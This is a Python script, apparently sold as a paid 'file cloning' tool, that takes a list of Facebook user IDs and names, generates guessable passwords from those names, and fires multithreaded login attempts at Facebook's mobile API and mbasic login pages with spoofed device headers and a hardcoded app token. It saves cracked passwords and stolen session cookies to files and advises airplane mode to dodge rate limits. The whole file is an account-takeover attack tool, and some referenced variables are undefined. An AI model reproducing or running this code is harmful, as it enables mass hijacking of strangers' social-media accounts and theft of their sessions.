

import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('loading Modules ...\n')



try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as AliAli
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []


sys.stdout.write('\x1b]2; Ali\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo=("""\033[1;37m
d8888b.  .d8b.  d8888b. db   dD 
88  `8D d8' `8b 88  `8D 88 ,8P' 
88   88 88ooo88 88oobY' 88,8P   
88   88 88~~~88 88`8b   88`8b   
88  .8D 88   88 88 `88. 88 `88. 
Y8888D' YP   YP 88   YD YP   YD\033[1;31m4\033[1;32m4\033[1;33m4
\033[1;37m-------------------------------------------
<=> AUTHOR    : DARK-XD
<=> GITHUB    : DARK-444
<=> TOOLS     : FILE
<=> VERSION   : 7.4
<=> STATUS    : PAID
-------------------------------------------
\033[1;37m-------------------------------------------""")
def linex():
        print('\033[1;37m-------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back Ali Menu ")
        exit()

def Ali():   
    os.system('clear')
    print(logo)
    print(' [1] File cloning\n [0] Exit menu')   
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
    	exit()  
    else:
        print('\n Select valid option ... ')
        exit()
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    #print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id) 
    elif option =='0':
        Ali()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SILENT-OK] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            ua = random.choice(ugen) 
            ua=uaa()
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [SILENT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [SILENT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ali] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id":adid,
"cpl": "true",
'family_device_id':nmm,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"source": "login","format": "json",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"generate_analytics_claim": "1",
"generate_machine_id": "1",
"meta_inf_fbmeta": "",
"advertiser_id":adid,
"currently_logged_in_userid": "0",
"locale":"en_US","client_country_code":"US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildHHL(),
            'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'MOBILE.LTE',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':ua,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'Connection': 'keep-alive',
			'x-fb-friendly-name':'ViewerReactionsMutation',
			'accept-encoding':'gzip, deflate',
			'accept': '*/*',
			'x-fb-http-engine': 'Liger',
			'content-length': '204'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ali] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id":adid,
"cpl": "true",
'family_device_id':nmm,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"source": "login","format": "json",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"generate_analytics_claim": "1",
"generate_machine_id": "1",
"meta_inf_fbmeta": "",
"advertiser_id":adid,
"currently_logged_in_userid": "0",
"locale":"en_US","client_country_code":"US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildHHL(),
            'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'MOBILE.LTE',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':ua,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'Connection': 'keep-alive',
			'x-fb-friendly-name':'ViewerReactionsMutation',
			'accept-encoding':'gzip, deflate',
			'accept': '*/*',
			'x-fb-http-engine': 'Liger',
			'content-length': '204'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Ali] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with AliAli(max_workers=30) as Aliworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                Aliworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Aliworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Aliworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Aliworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)              

Ali()